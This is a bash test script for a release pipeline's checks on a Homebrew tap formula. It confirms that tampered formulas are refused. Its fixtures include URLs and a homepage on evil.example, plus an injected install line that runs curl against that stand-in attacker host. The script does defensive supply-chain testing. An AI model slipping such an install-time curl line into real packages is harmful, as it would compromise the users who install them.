#!/usr/bin/env bash
# Checks .github/actions/tap-formula/check-url.sh: the honest formula passes; a url on another
# host, another tag or a second url line is refused with a one-line `release: ...` reason.
# Then check-diff.sh against the tap's real formula (tap-formula-test/tap-0.5.3.rb, fetched from
# ZigboxOrg/homebrew-tap on 2026-11-21): this repository's template, filled in, passes; any other
# change to the homepage, the licence or a comment, or undoing the move, is refused.
set -euo pipefail
here=$(cd "$(dirname "$0")" && pwd)
check=$here/actions/tap-formula/check-url.sh
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT
want=https://github.com/zigbox/zigbox/releases/download/v1.2.3/zbx-1.2.3-macos-universal.zip
die() { echo "tap-formula-test: $*" >&2; exit 1; }
make() { printf 'class Zigbox < Formula\n%s\n  version "1.2.3"\nend\n' "$1" > "$work/f.rb"; }
refuse() { # refuse NAME PATTERN
  if "$check" "$work/f.rb" "$want" 2> "$work/log"; then die "accepted: $1"; fi
  if ! grep -q '^release: ' "$work/log" || ! grep -q -- "$2" "$work/log"; then
    cat "$work/log" >&2; die "wrong reason: $1"
  fi
  echo "ok: refused: $1"
}
make "  url \"$want\""
"$check" "$work/f.rb" "$want" || die "refused the honest formula"
echo "ok: accepted: the honest formula"
make '  url "https://evil.example/zbx-1.2.3-macos-universal.zip"'
refuse "another host" "is not"
make "  url \"${want/v1.2.3/v1.2.2}\""
refuse "another tag" "is not"
make "  url \"$want\"
  url \"https://evil.example/x.zip\""
refuse "a second url" "exactly one"
make '  homepage "x"'
refuse "no url" "exactly one"
diff_check=$here/actions/tap-formula/check-diff.sh
tap=$here/tap-formula-test/tap-0.5.3.rb
fill() { # fill VERSION: the template as mac-release fills it
  sed -e "s|@URL@|https://github.com/ZigboxOrg/zigbox/releases/download/v$1/zbx-$1-macos-universal.zip|" \
    -e "s|@VERSION@|$1|" -e "s|@SHA256@|$(printf '%064d' 0)|" \
    "$here/../packaging/homebrew/zigbox.rb" > "$work/new.rb"
}
refuse_diff() { # refuse_diff NAME CURRENT: new.rb against CURRENT
  if "$diff_check" "$2" "$work/new.rb" 2> "$work/log"; then die "accepted: $1"; fi
  if ! grep -q '^release: the formula differs' "$work/log"; then cat "$work/log" >&2; die "wrong reason: $1"; fi
  echo "ok: refused: $1"
}
fill 0.6.0
"$diff_check" "$tap" "$work/new.rb" || die "refused the 0.6.0 formula against the tap's 0.5.3"
echo "ok: accepted: the template against the tap's 0.5.3 formula"
cp "$work/new.rb" "$work/tap-0.6.0.rb"
fill 0.6.1
"$diff_check" "$work/tap-0.6.0.rb" "$work/new.rb" || die "refused 0.6.1 against 0.6.0"
echo "ok: accepted: the next release against this one"
fill 0.6.0
sed -i 's|^  homepage .*|  homepage "https://evil.example/zigbox"|' "$work/new.rb"
refuse_diff "another homepage" "$tap"
fill 0.6.0
sed -i 's|"Apache-2.0", "GPL-2.0-only"|"Apache-2.0"|' "$work/new.rb"
refuse_diff "another licence" "$tap"
fill 0.6.0
sed -i 's|^  # zbx is Apache-2.0;|  # zbx is anything;|' "$work/new.rb"
refuse_diff "another licence comment" "$tap"
fill 0.6.0
sed -i 's|^  def install|  def install\n    system "curl", "https://evil.example"|' "$work/new.rb"
refuse_diff "an added line" "$tap"
cp "$tap" "$work/new.rb"
refuse_diff "undoing the move" "$work/tap-0.6.0.rb"
echo "tap-formula-test: all cases passed"
